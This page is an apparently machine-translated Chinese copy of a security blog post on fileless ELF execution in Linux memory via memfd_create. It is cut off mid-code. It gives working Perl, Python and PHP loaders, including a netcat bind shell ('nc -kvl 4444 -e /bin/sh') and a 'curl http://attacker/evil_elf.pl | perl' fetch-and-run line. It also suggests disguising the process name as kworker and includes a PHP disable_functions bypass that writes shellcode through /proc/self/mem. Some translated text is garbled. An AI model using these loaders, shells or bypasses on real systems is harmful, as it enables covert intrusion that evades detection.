<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>⚱️ 🛤️ 👏🏽 精灵在记忆中。 在Linux RAM中运行ELF ☹️ 👨🏽 🖥️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="无文件的恶意软件分发越来越流行。 这并不奇怪，因为此类程序的工作几乎没有痕迹。 在本文中，我们不会涉及在Windows内存中运行程序的技术。 我们专注于GNU / Linux。 Linux正确地统治了服务器市场，生活在数百万个嵌入式设备中，并提供了绝大多数的Web资源。 接下来，我们将简要回顾一下在...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>精灵在记忆中。 在Linux RAM中运行ELF</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/430902/"><p><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p>无文件的恶意软件分发越来越流行。 这并不奇怪，因为此类程序的工作几乎没有痕迹。 在本文中，我们不会涉及在Windows内存中运行程序的技术。 我们专注于GNU / Linux。  Linux正确地统治了服务器市场，生活在数百万个嵌入式设备中，并提供了绝大多数的Web资源。 接下来，我们将简要回顾一下在内存中执行程序的可能性，并证明即使在困难的条件下也可以做到。 </p><a name="habracut"></a><br><p> 无文件执行技术是秘密的；很难检测和跟踪其使用。 文件系统完整性控制工具不会警告管理员，因为不会发生对磁盘的写操作或磁盘上的文件更改。 防病毒软件（通常被* nix用户忽略）通常在启动后不监视程序内存。 此外，在许多GNU / Linux发行版中，安装后即刻可以使用各种调试实用程序，解释器，编程语言的编译器以及用于它们的库。 所有这些为使用隐蔽的无文件程序执行技术创造了极好的条件。 但是，除了其应用程序的优点之外，还有其他缺点-这些程序无法在目标主机停电或重启的情况下幸免。 但是，在主机运行时，该程序可以运行。 </p><br><p> 这样的技术不仅可以用于分发恶意软件，而且可以并且应该被使用。 如果程序执行的速度对您来说至关重要，请将其卸载到RAM中。 实际上，许多Linux发行版完全在RAM中运行时感觉很好，这使您可以在不保存任何文件的情况下使用硬盘驱动器。 从信息安全审计的角度来看，秘密执行程序的方法作为目标网络外围的后期操作和侦察阶段非常有用。 特别是如果最大保密性是审核条件之一。 <br> 根据<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">barkly.com</a>门户网站的数据，2018年，已经有35％的病毒攻击发生在内存中运行的恶意软件中。 </p><br><p> 对于Windows，网络犯罪分子会主动使用预先安装的Powershell系统，以便下载并立即执行代码。 这些技术由于在诸如Powershell Empire，Powersploit和Metasploit Framework之类的框架中的实现而得到广泛使用。 </p><br><h1 id="a-chto-naschet-linux"> 那Linux呢？ </h1><br><p> 在大多数情况下，安装在主机上的Linux发行版具有一组预安装的软件。 通常，提供开箱即用的编程语言解释器：Python，Perl和C编译器，PHP出现在附件的托管站点中。 此条件提供了使用这些语言执行代码的能力。 </p><br><p> 在Linux上，我们有几个众所周知的用于执行内存中代码的选项。 <br> 最简单的方法是使用预先安装在文件系统上的共享内存区域。 </p><br><p> 通过将可执行文件放在/ dev / shm或/ run / shm目录中，可以直接在内存中执行它，因为这些目录只不过是文件系统上安装的随机访问内存。 但是可以像其他任何目录一样使用ls查看它们。 通常，这些目录是使用noexec标志挂载的，这些目录中的程序执行仅对超级用户可用。 因此，要变得不那么显眼，您需要其他一些东西。 </p><br><p>更值得注意的是<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">memfd_create（2）</a>系统调用。 该系统调用的工作方式大致类似于<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">malloc（3）</a> ，但不返回指向内存区域的指针，而是返回指向匿名文件的文件描述符，该文件描述符仅在<code>/proc/PID/fd/</code>作为链接在文件系统中可见，通过该链接可以使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">执行（2）。</a> <br> 这是使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">memfd_create</a>系统调用的手册页<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">（俄语）</a> ： </p><br><p>  <em>“在名称中指定的</em> <code>name</code> <em>将用作文件名，并将显示为目录中相应符号链接的目标<code>memfd:</code> <code>/proc/self/fd/</code> 。显示名称始终以<code>memfd:</code>开头，并且仅用于调试。名称不会影响文件的行为。 “描述符，因此多个文件可以具有相同的名称，而不会产生任何后果。”</em> </p><br><p> 在C语言中使用<code>memfd_create()</code>的示例： </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p> 上面的代码使用<code>memfd</code> ，创建一个子进程，将其输出定向到一个临时文件，等待该子进程完成，并从该临时文件中读取其输出。 通常，管道“ |”用于在* nix中将一个程序的输出重定向到另一个程序的输入。 </p><br><p> 使用<code>syscall()</code>功能也可以在诸如perl，python等的解释语言中使用。接下来，考虑一种可能的情况，并演示使用<code>memfd_create()</code>将可执行文件加载到内存中的<code>memfd_create()</code> 。 </p><br><h3 id="perl"> 佩尔 </h3><br><p> 假设我们有一个命令注入形式的入口点。 <br> 我们需要一种在目标系统上进行系统调用的方法。 <br> 在perl中， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">syscall（）</a>函数将帮助我们解决这一问题。 <br> 我们还需要一种将ELF作为匿名文件的内容直接写入内存的方法。 <br> 为此，我们将ELF直接放置在脚本主体中，然后通过可用的命令注入将其转移到目标系统。 或者，您也可以通过网络下载可执行文件。 <br> 但在此之前值得保留。 我们需要知道目标主机上的Linux内核版本，因为必需的<code>memfd_create()</code>系统调用仅在<strong>3.17</strong>版及更高版本中可用。 </p><br><p> 让我们仔细<code>memfd_create()</code>和<code>execve()</code> </p><br><p> 对于我们的匿名文件，我们将使用常量<code>MFD_CLOEXEC</code> ，该常量“为新的打开文件描述符设置<code>close-on-exec (FD_CLOEXEC)</code>标记<code>close-on-exec (FD_CLOEXEC)</code> ”。 这意味着在我们使用<code>execve()</code>执行ELF之后，文件描述符将自动关闭。 </p><br><p> 由于我们将使用Perl语言的<code>syscall()</code>函数，因此将需要数值来调用<code>syscall</code>及其参数。 <br> 您可以在<code>/usr/include</code>或Internet上找到它们。 可以在<code>#define</code>以<code>__NR_</code>开头找到系统电话号码 <br> 在我们的示例中，对于64位操作系统， <code>memfd_create()</code>的编号为319。 常量为<code>FD_CLOSEXEC 0x0001U</code> （即<code>linux/memfd.h</code> ） </p><br><p> 现在我们有了所有必要的数值，并且可以在Perl中编写C <code>memfd_create(name, MFD_CLOEXEC)</code>的<code>memfd_create(name, MFD_CLOEXEC)</code>的类似物。 <br> 我们还需要提供一个将显示在<code>/memfd:</code>的文件名<code>/memfd:</code> <br> 最好选择一个与<code>[:kworker]</code>相似的名称或其他名称，而不引起怀疑。 <br> 例如，我们将一个空字符串传递给name参数： </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p> 现在，在$ fd中有匿名文件描述符，我们需要将ELF写入此文件。 <br>  perl中的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">open（）</a>函数通常用于打开文件，但是使用<code>&gt;&amp;=FD</code>构造，将描述符而不是文件名传递给此函数，我们将已经打开的文件描述符转换为文件句柄。 <br>  <code>autoflush[]</code>对<code>autoflush[]</code>也很有用： </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p> 现在，我们有一个引用匿名文件的句柄。 </p><br><p> 接下来，我们需要将可执行文件转换为可以放置在Perl脚本主体中的数据。 <br> 为此，我们执行： </p><br><pre> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p> 我们得到许多类似的信息： </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p> 执行完它们后，我们会将可执行文件放入内存中。 我们剩下的就是启动它。 </p><br><h4 id="fork"> 叉子（） </h4><br><p>  （可选）我们可以使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">fork（）</a> 。 这根本没有必要。 但是，如果我们不仅要运行ELF并终止进程，就需要使用<code>fork()</code> 。 <br> 通常，在perl中创建子进程看起来像这样： </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p>  <code>fork()</code>的有用之处还<code>fork()</code> ，通过将它与<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">setsid（2）</a>一起调用，可以将子进程与父进程分开，并让父进程终止： </p><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { #   exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p> 现在，我们可以在许多过程中运行ELF。 </p><br><h4 id="execve"> 执行（） </h4><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Execve（）</a>是允许我们执行程序的系统调用。  Perl通过<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Exec（）</a>函数为我们提供了类似的功能，该函数的工作方式与上述系统调用类似，但是语法更简单，更方便。 <br> 我们需要将两件事传递给<code>exec()</code> ：我们要执行的文件（我们先前加载的ELF内存），以及进程名称作为传递的参数之一。 通常，进程名称与可执行文件的名称相对应。 但是由于在进程列表中将看到<code>/proc/PID/fd/3</code> ，因此我们将进程称为其他名称。 <br>  <code>exec()</code>的语法如下： </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p> 上面的示例启动了Netcat。 但是，我们希望推出一些类似后门的产品。 <br> 正在运行的进程在<code>/proc/PID/fd</code>没有指向匿名文件的链接，但是我们总是可以在链接<code>/proc/PID/exe</code>找到我们的ELF，该文件指向正在运行的进程的文件。 <br> 因此，我们在Linux内存中启动了ELF，而无需接触磁盘甚至文件系统。 <br> 可以快速方便地将可执行文件下载到目标系统，例如，通过将脚本传递给Perl解释器，我们在其中将ELF放置在其主体中，并将​​其放置在外部虚拟主机上： <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python"> 巨蟒 </h3><br><p> 与Perl选项类似，我们需要执行以下操作： </p><br><ul><li> 使用memfd_create（）系统调用，在内存中创建一个匿名文件 </li><li> 将可执行的ELF写入此文件 </li><li> 执行它，还可以选择用fork（）执行几次 </li></ul><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p> 对于python，要调用<code>syscall</code>我们需要标准模块<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ctypes</a>和<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">os</a>来编写和执行文件并控制进程。 一切都完全类似于perl版本。 <br> 在上面的代码中，我们将先前位于<code>/tmp/</code>的文件写入文件。 但是，没有什么可以阻止我们从Web服务器下载文件。 </p><br><h3 id="php">  p </h3><br><p> 在这个阶段，我们已经可以使用perl和python。 这些语言的解释程序默认安装在许多操作系统上。 但最有趣的是，一如既往。 <br> 如果由于某种原因我们无法使用perl或python解释器，那么使用PHP会很棒。 这种语言在Web开发人员中非常流行。 而且，如果我们已经找到了在Web应用程序中执行代码的能力，那么PHP解释器很可能会满足我们的要求。 </p><br><p> 不幸的是，php没有内置的机制来调用<code>syscall</code> 。 <br> 我们在rdot论坛上碰到了Beched'a的帖子（谢谢Beched！），该帖子通过当前进程内存中的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">procfs</a> <code>/proc/self/mem</code>覆盖了<code>open</code>函数对<code>system</code>的调用，并绕过了<code>disable_functions</code> 。 <br> 我们使用此技巧将函数重写为代码，这将导致必要的系统调用。 <br> 我们将以汇编器上shellcode的形式将syscall传递给php解释器。 <br> 系统调用将需要通过一系列命令传递。 <br> 让我们开始编写一个PHP脚本。 接下来会有很多魔术。 </p><br><p> 首先，我们表示必要的参数： </p><br><pre> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p> 表示移位-内存中的上限值和下限值，我们稍后将在其中放置shellcode： </p><br><pre> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p> 接下来是二进制文件“解压”的功能。 为此，我们使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">bin2hex（）</a>二进制数据中的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">hexdex（）</a>函数以<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">相反的顺序</a>将二进制数据转换为十进制表示形式（用于存储）： </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p> 接下来，解析<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ELF</a>文件以获得偏移量： </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p> 此外，我们显示有关已安装的PHP版本的信息： </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p> 我们检查操作系统的位深度和Linux内核的版本： </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p> 为了规避<code>disable_functions</code>的限制，脚本会动态重写<code>open@plt</code>函数的地址。 我们在beched'a代码中添加了一些内容，现在可以将shellcode放入内存中了。 </p><br><p> 首先，您需要在PHP解释器本身的二进制文件中找到移位，为此，我们转到<code>/proc/self/exe</code>并使用上述<code>parseelf()</code>函数解析可执行文件： </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span 